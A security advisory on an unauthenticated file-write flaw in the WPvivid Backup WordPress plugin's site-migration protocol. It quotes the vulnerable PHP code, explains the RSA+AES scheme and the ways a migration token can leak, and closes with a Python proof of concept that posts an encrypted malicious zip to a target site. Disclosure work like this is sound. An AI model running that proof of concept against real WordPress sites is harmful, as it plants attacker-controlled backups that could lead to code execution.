# WPVIVID-001: Unauthenticated Arbitrary File Write via Migration Protocol

## Severity: HIGH (CVSS ~7.5)

## Summary

The WPvivid Backup plugin implements a site-to-site migration protocol that allows unauthenticated HTTP POST requests to write files to the server's backup directory. The only authentication barrier is RSA encryption using a shared public key. If an attacker obtains the migration token (public key), they can write arbitrary zip/gz/tar/sql files without any WordPress authentication.

## Vulnerable Code

**File:** `includes/customclass/class-wpvivid-send-to-site.php`

### Entry Point (lines 25-62)

The class constructor registers a `plugins_loaded` hook that fires on EVERY request:

```php
add_action('plugins_loaded', array($this, 'plugins_loaded'));
```

The handler dispatches based on `$_POST['wpvivid_action']` with zero WordPress auth:

```php
public function plugins_loaded()
{
    if (!empty($_POST) && isset($_POST['wpvivid_action']))
    {
        @ini_set( 'display_errors', 0 );
        if($_POST['wpvivid_action']=='send_to_site_connect')
        {
            $this->send_to_site_connect();
        }
        else if($_POST['wpvivid_action']=='send_to_site')
        {
            $this->send_to_site();  // <-- writes files
        }
        // ... more actions ...
        die();
    }
}
```

### File Write Logic (lines 583-706)

The `send_to_site()` function:

1. Reads the private key from `wp_options('wpvivid_api_token')`
2. Decrypts `$_POST['wpvivid_content']` using RSA
3. Extracts filename, offset, and data from the decrypted JSON
4. Writes file data to `wp-content/{backupdir}/`

```php
$option = get_option('wpvivid_api_token', $default);
// Only checks: not empty, not expired
$crypt = new WPvivid_crypt(base64_decode($option['private_key']));
$body = base64_decode($_POST['wpvivid_content']);
$data = $crypt->decrypt_message($body);

$params = json_decode($data, 1);
$safe_name = basename($params['name']);
$safe_name = preg_replace('/[^a-zA-Z0-9._-]/', '', $safe_name);
// Extension whitelist: zip, gz, tar, sql
$file_path = WP_CONTENT_DIR . '/' . $dir . '/' . str_replace('wpvivid', 'wpvivid_temp', $safe_name);

$handle = fopen($file_path, 'rb+');
fwrite($handle, base64_decode($params['data']));
```

### Migration Token Generation (class-wpvivid-migrate.php, lines 955-966)

```php
$keys = $rsa->createKey($key_size);  // 2048-bit RSA
$options['public_key'] = base64_encode($keys['publickey']);
$options['private_key'] = base64_encode($keys['privatekey']);
WPvivid_Setting::update_option('wpvivid_api_token', $options);

// Public key shared in URL:
$url = $url . '?domain=' . $options['domain'] . '&token=' . $options['public_key'] . '&expires=' . $expires;
```

## Crypto Scheme

The encryption uses a hybrid RSA+AES scheme (`class-wpvivid-crypt.php`):
- Random 32-byte AES key generated per message
- AES key encrypted with RSA public key
- Message encrypted with AES
- Format: `{RSA_key_len_hex}{RSA_encrypted_key}{cipher_len_hex}{AES_ciphertext}`

The **sending site** encrypts with the public key. The **receiving site** decrypts with the private key. The public key IS the migration token shared in the URL.

## Attack Scenario

1. Admin generates a migration URL (can be set to "Never" expire)
2. URL format: `https://target.com?domain=...&token={base64_public_key}&expires=0`
3. Attacker obtains the public key via:
   - Intercepting the migration URL (HTTP, email, chat, logs)
   - Reading server access logs (token is in GET parameters)
   - Social engineering
4. Attacker crafts encrypted payload using the public key
5. POST to `https://target.com/` with `wpvivid_action=send_to_site` and encrypted content
6. Malicious zip/tar file is written to the backup directory

## Mitigating Factors

- Requires the migration public key (not guessable -- 2048-bit RSA)
- File extension limited to zip/gz/tar/sql
- File content alone does not achieve code execution; a subsequent restore operation would be needed
- Migration tokens expire (unless set to "Never")
- The token is only generated on explicit admin action

## Impact

- **File write**: Attacker can place arbitrary content in zip/gz/tar/sql files in the backup directory
- **Potential RCE chain**: If an admin later restores from the planted backup, attacker-controlled code executes
- **DoS**: Disk exhaustion by repeatedly writing large files
- **Data poisoning**: Planted backup could contain a modified database with admin credentials

## Proof of Concept (Conceptual)

```python
# Requires: pycryptodome
# 1. Obtain public_key from migration URL token parameter
# 2. Craft encrypted payload
# 3. POST to target

import requests
import json
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes

public_key_b64 = "<from_migration_url>"
public_key = base64.b64decode(public_key_b64)

# Generate AES key
aes_key = get_random_bytes(32)

# Encrypt AES key with RSA
rsa_key = RSA.import_key(public_key)
cipher_rsa = PKCS1_v1_5.new(rsa_key)
encrypted_aes_key = cipher_rsa.encrypt(aes_key)

# Encrypt payload with AES (Rijndael-256)
payload = json.dumps({
    "backup_id": "evil_backup",
    "name": "wpvivid-evil.zip",
    "offset": 0,
    "data": base64.b64encode(b"PK...malicious zip content...").decode(),
    "file_size": 999999,
    "md5": "..."
})

cipher_aes = AES.new(aes_key, AES.MODE_ECB)
# pad payload
pad_len = 16 - (len(payload) % 16)
padded = payload + chr(pad_len) * pad_len
encrypted_data = cipher_aes.encrypt(padded.encode())

# Build message format
key_len_hex = format(len(encrypted_aes_key), '03x')
data_len_hex = format(len(encrypted_data), '016x')
message = key_len_hex.encode() + encrypted_aes_key + data_len_hex.encode() + encrypted_data

requests.post("https://target.com/", data={
    "wpvivid_action": "send_to_site",
    "wpvivid_content": base64.b64encode(message).decode()
})
```

Note: This PoC is conceptual. The actual phpseclib Rijndael implementation may differ from pycryptodome's AES.
